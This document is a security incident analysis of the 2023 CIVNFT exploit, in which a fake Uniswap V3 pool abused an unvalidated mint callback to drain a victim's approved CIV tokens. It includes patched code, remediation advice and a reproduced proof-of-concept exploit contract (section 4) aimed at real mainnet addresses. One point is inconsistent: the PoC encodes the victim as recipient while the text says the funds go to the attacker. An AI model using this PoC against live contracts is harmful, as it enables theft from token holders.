# CIVNFT — Uniswap V3 Callback Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-07-08 |
| **Protocol** | CIVNFT (CivTrade — CivFund Ecosystem) |
| **Chain** | Ethereum |
| **Loss** | ~$180,000 (89,789 CIV tokens) |
| **Attacker EOA** | [0xbf9d...ff66](https://etherscan.io/address/0xbf9df575670c739d9bf1424d4913e7244ed3ff66) |
| **Attack Contract** | [0x1ae3...25ec](https://etherscan.io/address/0x1ae3929e1975043e5443868be91cac12d8cc25ec) |
| **Attack Tx** | [0x93a0...aceb](https://etherscan.io/tx/0x93a033917fcdbd5fe8ae24e9fe22f002949cba2f621a1c43a54f6519479caceb) |
| **Vulnerable Contract** | [0xf169...0580](https://etherscan.io/address/0xf169bd68ed72b2fdc3c9234833197171aa000580) |
| **Victim Wallet** | [0x512e...fFD](https://etherscan.io/address/0x512e9701D314b365921BcB3b8265658A152C9fFD) |
| **Attack Block** | 17,649,876 |
| **Root Cause** | Missing caller validation in `uniswapV3MintCallback` — a fake Uniswap V3 Pool triggers the callback to drain victim's approved tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/CIVNFT_exp.sol) |

---

## 1. Vulnerability Overview

CIVNFT is an NFT-based position management contract operating within the CivFund ecosystem on Ethereum. It represents CivTrade DEX liquidity positions as NFTs and integrates internally with the Uniswap V3 protocol.

This contract contained two critical access control vulnerabilities.

**Vulnerability 1**: The public function `0x7ca06d68` (estimated: `openPosition` or similar) allows registering an arbitrary address as a Uniswap V3 Pool. This function performs no validation whatsoever to verify that `msg.sender` is a trusted party.

**Vulnerability 2**: The `uniswapV3MintCallback` function (`0xd3487997`) does not verify that `msg.sender` is an actual Uniswap V3 Pool. In normal flow, this callback should only be invoked by a Uniswap V3 Pool during liquidity provision, but anyone could call it directly.

The attacker combined these two vulnerabilities to disguise their contract as a fake Uniswap V3 Pool, then drained the entire balance of a victim who had approved CIV tokens to CIVNFT.

With no flash loan required — purely through **missing access control on a public function** and **unvalidated callback caller** — approximately $180,000 in damages occurred.

---

## 2. Vulnerable Code Analysis

### 2.1 Missing Pool Address Validation in the Public Position-Open Function (Core Vulnerability)

The position-open function of the CIVNFT contract (selector: `0x7ca06d68`) accepts a Pool address as an external parameter and does not verify whether that address is a genuine Uniswap V3 Pool.

```solidity
// ❌ Vulnerable code — trusts the pool address without validation
function openPosition(
    address pool,          // ❌ Any contract can be designated as a Uniswap V3 Pool
    bytes memory priceStr, // Price string (e.g., "0.000059")
    int24 tick,            // Tick value (-97385)
    uint256 amount0,       // CIV amount
    uint256 amount1,       // WETH amount
    bool flag              // Flag
) external {
    // ❌ No validation that pool was created by an actual Uniswap V3 Pool Factory!
    // ❌ No validation that msg.sender is an authorized user!

    IUniswapV3Pool(pool).mint(
        address(this),   // Recipient (CIVNFT contract itself)
        tick - 5,
        tick + 5,
        uint128(amount0),
        abi.encode(...)  // Callback data (includes victim address)
    );
}
```

**Fixed Code (✅ After Patch)**:

```solidity
// ✅ Fixed code — verifies pool authenticity via Factory
address constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

function openPosition(
    address pool,
    bytes memory priceStr,
    int24 tick,
    uint256 amount0,
    uint256 amount1,
    bool flag
) external onlyAuthorized {  // ✅ Only authorized callers permitted
    // ✅ Verify it is a genuine Pool created by Uniswap V3 Factory
    address token0 = IUniswapV3Pool(pool).token0();
    address token1 = IUniswapV3Pool(pool).token1();
    uint24 fee = IUniswapV3Pool(pool).fee();
    address expectedPool = IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(token0, token1, fee);
    require(pool == expectedPool, "CIVNFT: invalid pool address");

    IUniswapV3Pool(pool).mint(...);
}
```

**Issue**: Any contract implementing the Pool interface can register itself as a Pool, giving the attacker complete control over the flow.

---

### 2.2 Missing Caller Validation in uniswapV3MintCallback (Secondary Vulnerability)

The callback function invoked by a Uniswap V3 Pool during `mint()` can be called directly from outside.

```solidity
// ❌ Vulnerable code — does not validate the callback caller
function uniswapV3MintCallback(
    uint256 amount0Owed,   // Amount of CIV to supply (attacker-specified arbitrarily)
    uint256 amount1Owed,   // Amount of WETH to supply
    bytes calldata data    // Callback data (includes victim address)
) external {
    // ❌ No validation that msg.sender is an actual Uniswap V3 Pool!
    // Anyone can call this callback directly to transfer tokens from an arbitrary address

    (address payer, address recipient) = abi.decode(data, (address, address));

    if (amount0Owed > 0) {
        // ❌ No validation that payer actually consented to this transaction
        CIV.transferFrom(payer, recipient, amount0Owed);
    }
    if (amount1Owed > 0) {
        WETH.transferFrom(payer, recipient, amount1Owed);
    }
}
```

**Fixed Code (✅ After Patch)**:

```solidity
// ✅ Fixed code — stores pool address and validates the callback caller
mapping(bytes32 => address) private _activePool; // Tracks active pool per transaction

function uniswapV3MintCallback(
    uint256 amount0Owed,
    uint256 amount1Owed,
    bytes calldata data
) external {
    // ✅ Verify msg.sender is a registered trusted Pool
    require(_isValidPool(msg.sender), "CIVNFT: callback from unknown pool");

    (address payer, address recipient) = abi.decode(data, (address, address));

    // ✅ payer must be the user registered through msg.sender (Pool)
    require(payer == _authorizedPayer[msg.sender], "CIVNFT: unauthorized payer");

    if (amount0Owed > 0) {
        CIV.transferFrom(payer, recipient, amount0Owed);
    }
}

function _isValidPool(address pool) internal view returns (bool) {
    // Verify pool authenticity via Factory
    // ...
}
```

**Issue**: After registering a fake Pool in Step 1, the attacker calls this function directly from within the fake Pool's `mint()` callback to transfer the victim's balance.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The victim (`0x512e...fFD`) had granted an infinite approval of CIV tokens to the CIVNFT contract for normal CivTrade service use
- The attacker deployed a malicious contract implementing the Uniswap V3 Pool interface (`token0()`, `token1()`, `slot0()`, `mint()`)
- The malicious contract's `mint()` callback was designed to re-invoke CIVNFT's `uniswapV3MintCallback`

### 3.2 Execution Phase

1. **[Step 1]**: Attacker calls CIVNFT's public function `0x7ca06d68`
   - `pool`: attacker's fake Pool contract address
   - `tick`: -97,385 (current tick of the real CIV/WETH Uniswap V3 Pool)
   - `amount0`: 195,476,868,337,608,980,000,000 (CIV amount close to victim's balance)

2. **[Step 2]**: CIVNFT calls `mint()` on the fake Pool
   - Victim address is encoded into the callback data and passed along

3. **[Step 3]**: The fake Pool's `mint()` callback executes
   - Directly calls CIVNFT's `uniswapV3MintCallback` (selector: `0xd3487997`)
   - `amount0Owed`: victim's entire CIV balance (`CIV.balanceOf(victim)`)
   - `data`: `abi.encode(victim, victim)` — both payer and recipient set to the victim

4. **[Step 4]**: CIVNFT's `uniswapV3MintCallback` executes
   - Without validating `msg.sender`, immediately executes `CIV.transferFrom(victim, attacker, amount)`
   - Victim's approved 89,789 CIV is transferred to the attacker's contract

5. **[Step 5]**: Attack complete
   - NFT Position #61 is minted to the attacker
   - 89,789 CIV (~$180,000) stolen

### 3.3 Attack Flow Diagram

```
┌──────────────────────────────────────────────────────────────┐
│  Attacker (0xbf9d...ff66)                                     │
│  Deploys attack contract (implements fake Uniswap V3 Pool     │
│  interface)                                                   │
└────────────────────────┬─────────────────────────────────────┘
                         │ ① call 0x7ca06d68(fakePool, ...)
                         ▼
┌──────────────────────────────────────────────────────────────┐
│  CIVNFT Contract (0xf169...0580)                              │
│  openPosition() — no Pool address validation ❌              │
└────────────────────────┬─────────────────────────────────────┘
                         │ ② fakePool.mint(recipient=CIVNFT, data=victim)
                         ▼
┌──────────────────────────────────────────────────────────────┐
│  Fake Pool (attacker contract, 0x1ae3...25ec)                 │
│  mint() callback received — immediately re-invokes           │
└────────────────────────┬─────────────────────────────────────┘
                         │ ③ call 0xd3487997(balanceOf(victim), 0, victim||victim)
                         ▼
┌──────────────────────────────────────────────────────────────┐
│  CIVNFT Contract (0xf169...0580)                              │
│  uniswapV3MintCallback() — no msg.sender validation ❌       │
│  CIV.transferFrom(victim → attacker, 89,789 CIV)             │
└────────────────────────┬─────────────────────────────────────┘
                         │ ④ CIV transfer executed
                         ▼
┌──────────────────────────────────────────────────────────────┐
│  Victim Wallet (0x512e...fFD)                                 │
│  CIV balance: 89,789 CIV → 0                                 │
│  (had previously granted approve to CIVNFT)                  │
└──────────────────────────────────────────────────────────────┘
                         │ ⑤ NFT Position #61 minted
                         ▼
┌──────────────────────────────────────────────────────────────┐
│  Attacker Contract (0x1ae3...25ec)                            │
│  Final gain: 89,789 CIV (~$180,000) + NFT Position #61       │
└──────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: 89,789 CIV (~$180,000) + NFT Position #61
- **Protocol loss**: Full approved CIV balance from victim wallet
- **Single transaction**: Completed in block 17,649,876 (gas cost ~0.024 ETH)

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// CIVNFT exploit core logic — with English comments
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/CIVNFT_exp.sol

contract CIVNFTTest is Test {
    IERC20 private constant CIV  = IERC20(0x37fE0f067FA808fFBDd12891C0858532CFE7361d);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address private constant CIVNFT  = 0xF169BD68ED72B2fdC3C9234833197171AA000580;
    address private constant victim  = 0x512e9701D314b365921BcB3b8265658A152C9fFD;

    // [Step 1] The attack contract itself acts as a fake Uniswap V3 Pool
    // The following functions are spoofed implementations to satisfy the Pool interface
    function token0() external view returns (address) { return address(CIV); }
    function token1() external view returns (address) { return address(WETH); }
    function tickSpacing() external pure returns (int24) { return 60; }

    // [Step 2] Returns a fake price when CIVNFT trusts the Pool and calls slot0()
    function slot0() external pure returns (Slot0 memory) {
        return Slot0({
            sqrtPriceX96: 590_212_530_842_204_246_875_907_781, // fake current price
            tick: -97_380,     // fake current tick
            // ... (remaining fields omitted)
        });
    }

    // [Step 3] When CIVNFT calls mint(), abuse the callback in reverse
    function mint(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount,
        bytes calldata data
    ) external returns (uint256, uint256) {
        // Directly calls CIVNFT's uniswapV3MintCallback
        // Since there is no msg.sender validation, anyone can call this callback
        callUniswapV3MintCallback();
    }

    function testExploit() public {
        // Record balance before attack
        emit log_named_decimal_uint(
            "Attacker CIV balance before attack",
            CIV.balanceOf(address(this)), CIV.decimals()
        );

        // [Step 4] Call CIVNFT's vulnerable function — registers fake Pool (address(this))
        call0x7ca06d68();

        // Print balance after attack
        emit log_named_decimal_uint(
            "Attacker CIV balance after attack",
            CIV.balanceOf(address(this)), CIV.decimals()
        );
    }

    // [Key] Calls CIVNFT's position-open function — exploits missing Pool validation
    function call0x7ca06d68() internal {
        (bool success,) = CIVNFT.call(
            abi.encodeWithSelector(
                bytes4(0x7ca06d68),       // vulnerable position-open function
                address(this),            // fake Uniswap V3 Pool = attacker contract
                abi.encodePacked("0.000059"), // price string
                -97_385,                  // int24 tick value
                195_476_868_337_608_980_000_000, // amount
                0,
                true
            )
        );
        require(success, "CIVNFT function call failed");
    }

    // [Key] Directly calls uniswapV3MintCallback — exploits missing caller validation
    function callUniswapV3MintCallback() internal {
        bytes memory data = abi.encode(victim, victim); // payer=victim, recipient=victim
        (bool success,) = CIVNFT.call(
            abi.encodeWithSelector(
                bytes4(0xd3487997),        // uniswapV3MintCallback
                CIV.balanceOf(victim),    // amount0Owed = victim's full balance ❌
                0,                        // amount1Owed
                data                      // encoded (victim, victim)
            )
        );
        require(success, "Callback call failed");
        // Result: CIVNFT executes CIV transfer from victim → (this contract)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing Access Control — Pool Address Not Validated | CRITICAL | CWE-284 (Improper Access Control) |
| V-02 | Unvalidated Untrusted External Callback Caller | CRITICAL | CWE-346 (Origin Validation Error) |
| V-03 | Arbitrary Transfer of Approved Tokens Permitted | HIGH | CWE-862 (Missing Authorization) |
| V-04 | Absence of Input Parameter Validation | HIGH | CWE-20 (Improper Input Validation) |

### V-01: Missing Access Control — Pool Address Not Validated

- **Description**: The `openPosition` function (selector `0x7ca06d68`) does not validate whether the address passed as the `pool` parameter is an actual Pool created by the Uniswap V3 Factory. Anyone can register an arbitrary contract as a Pool and manipulate CIVNFT's internal logic.
- **Impact**: The attacker can control the entire position-open flow, constructing a reentrancy path that steals the victim's approved tokens.
- **Attack Conditions**: (1) Public function accessible, (2) Pool interface implementable, (3) Victim has approved CIVNFT

### V-02: Unvalidated Untrusted External Callback Caller

- **Description**: The `uniswapV3MintCallback` function (selector `0xd3487997`) does not validate `msg.sender`. This function should only be called by a Uniswap V3 Pool, but anyone can call it directly.
- **Impact**: The attacker can arbitrarily specify the victim address and amount passed to the callback, immediately draining the victim's entire approved CIV balance.
- **Attack Conditions**: (1) Function selector known, (2) Victim address known, (3) Victim has approved CIVNFT

### V-03: Arbitrary Transfer of Approved Tokens Permitted

- **Description**: As a consequence of V-01 and V-02, the attacker can specify an arbitrary `payer` address and cause tokens to be transferred from that address. The actual token transfer executes in the form `CIV.transferFrom(victim, attacker, balance)`.
- **Impact**: Any wallet that has granted an approval to CIVNFT can become a victim.
- **Attack Conditions**: Victim has previously granted CIV approval to the CIVNFT contract

### V-04: Absence of Input Parameter Validation

- **Description**: The `openPosition` function has no validation whatsoever on tick ranges, Pool address, amounts, etc. The attacker can use the real Pool's tick range directly or specify extreme amounts without being rejected.
- **Impact**: Serves as an auxiliary element in constructing the vulnerability chain.
- **Attack Conditions**: Public function callable

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ [Emergency Patch 1] Pool address validation — using Uniswap V3 Factory
address constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

function openPosition(address pool, /* ... */) external {
    // ✅ Pool authenticity must be verified via Factory
    address token0 = IUniswapV3Pool(pool).token0();
    address token1 = IUniswapV3Pool(pool).token1();
    uint24 fee = IUniswapV3Pool(pool).fee();
    require(
        IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(token0, token1, fee) == pool,
        "CIVNFT: invalid pool — not registered in Uniswap V3 Factory"
    );
    // ...
}

// ✅ [Emergency Patch 2] Callback caller validation — only trusted Pools permitted
address private _currentPool; // Pool address for the currently in-progress transaction

function uniswapV3MintCallback(
    uint256 amount0Owed,
    uint256 amount1Owed,
    bytes calldata data
) external {
    // ✅ Verify msg.sender is the Pool in use for the current transaction
    require(msg.sender == _currentPool, "CIVNFT: callback from unknown pool");
    // ✅ Additionally re-verify it is a Factory-verified Pool
    require(_isVerifiedPool(msg.sender), "CIVNFT: unregistered pool");

    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Pool address not validated | Mandatory Uniswap V3 Factory `getPool()` verification; maintain an allowed Pool whitelist |
| V-02 Callback caller not validated | Add Reentrancy Guard; track callback sender via `_currentPool` state variable |
| V-03 Arbitrary payer specification | `payer` must be restricted to `msg.sender` or an address verified by prior signature only |
| V-04 Input not validated | Add parameter validity checks for tick ranges, amount caps, etc. |
| General — Privilege separation | Restrict `openPosition` with an `onlyAuthorized` modifier, or design it to be callable only through a service contract |
| General — Monitoring | Build anomaly detection system for `transferFrom` events on the CIVNFT contract |

---

## 7. Lessons Learned

1. **Callback functions must always validate their caller**: DEX protocol callback functions such as `uniswapV3MintCallback` and `uniswapV3SwapCallback` must always verify via the Factory that `msg.sender` is an actual Pool. Omitting this allows anyone to call the callback directly and drain approved tokens.

2. **When accepting external contract addresses as parameters, their trustworthiness must be verified**: Whenever a user can input an arbitrary contract address, it must be validated against a trusted registry (such as the Uniswap V3 Factory).

3. **The combination of a reentrancy vulnerability and an access control vulnerability is lethal**: This attack is a composite pattern of reentrancy (re-invoking CIVNFT's function from within the attacker contract's `mint()` callback) and missing access control. The CEI (Checks-Effects-Interactions) pattern and ReentrancyGuard must be applied simultaneously.

4. **Token approvals should be limited to the minimum required amount**: The victim had granted an infinite (max) approval, which maximized the damage. Both UI-level guidance prompting users to approve only the necessary amount and smart contract-level validation are required.

5. **Security checklists must be followed when integrating with Uniswap V3**: All Uniswap V3 callbacks (`uniswapV3MintCallback`, `uniswapV3SwapCallback`, `uniswapV3FlashCallback`) require double verification: `msg.sender == pool` and `pool == factory.getPool(...)`.

6. **A professional security audit before smart contract deployment is mandatory**: This vulnerability is a violation of basic access control principles and could have been detected during a code review. In particular, features integrating with external protocols (such as Uniswap V3) require an audit covering the entire integration scenario end-to-end.

---

## 8. On-Chain Verification

On-chain transaction lookup results (based on block explorer):

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual Value | Match |
|------|--------|-------------|---------|
| Attack Tx Block | 17,649,875 (fork block) | 17,649,876 (actual attack block) | Approximate match |
| CIV amount stolen | `CIV.balanceOf(victim)` (dynamic) | 89,789.15 CIV | Match (full balance) |
| USD loss equivalent | ~$180,000 | ~$180,000 | Match |
| Gas cost | — | ~0.0237 ETH (~$53) | — |
| NFT Position ID | — | #61 | Confirmed |

### 8.2 On-Chain Event Log Sequence

1. **Call** → `CIVNFT.0x7ca06d68(fakePool, ...)` — attacker calls vulnerable function
2. **Call** → `FakePool.mint(CIVNFT, ...)` — CIVNFT calls fake Pool's mint()
3. **Call** → `CIVNFT.0xd3487997(89789 CIV, 0, victim||victim)` — callback abused
4. **Transfer(ERC-20)** → `CIV: victim(0x512e) → attacker_contract(0x1ae3)`, 89,789.15 CIV
5. **Transfer(ERC-721)** → `NFT Position #61: 0x0000 → attacker_contract(0x1ae3)` minted

### 8.3 Precondition Verification

| Condition | Status |
|------|------|
| Victim's CIV approve to CIVNFT | Pre-approved (infinite approve granted for service use) |
| Vulnerable function visibility | public/external, no access control |
| Attacker contract preparation | Deployed in a block prior to the attack Tx |
| Flash loan required | Not required (only victim's prior approval exploited) |

---

*References*
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/CIVNFT_exp.sol)
- [Phalcon Analysis](https://twitter.com/Phalcon_xyz/status/1677722208893022210)
- [CivFund Official Incident Analysis](https://news.civfund.org/civtrade-hack-analysis-9a2398a6bc2e)
- [SolidityScan Analysis](https://blog.solidityscan.com/civnft-hack-analysis-4ee79b8c33d1)
- [Etherscan Attack Tx](https://etherscan.io/tx/0x93a033917fcdbd5fe8ae24e9fe22f002949cba2f621a1c43a54f6519479caceb)